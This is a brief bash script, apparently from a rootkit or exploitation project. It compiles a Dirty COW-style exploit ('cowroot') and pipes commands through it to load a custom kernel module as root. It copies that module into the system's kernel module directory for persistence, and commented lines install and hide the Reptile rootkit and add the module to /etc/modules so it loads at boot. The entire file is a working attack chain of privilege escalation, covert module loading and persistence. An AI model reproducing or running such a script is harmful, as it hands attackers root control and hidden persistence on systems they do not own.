#!/bin/bash
gcc cowroot.c -o cowroot -pthread
gnome-terminal --command ./testServer
make --file=Makefile
echo "insmod combo.ko &&\
echo inserted &&\
cp combo.ko /lib/modules/`uname -r`/kernel/net/unix/combo.ko &&\
echo startup" | ./cowroot
# ./Reptile/setup.sh install && ./Reptile/reptile_cmd tcp 127.0.0.1 1234 hide"| ./cowroot
# grep -v combo /etc/modules | sudo cat > /etc/modules &&\
# sudo printf '\ncombo\n' >> /etc/modules && cat /etc/modules"

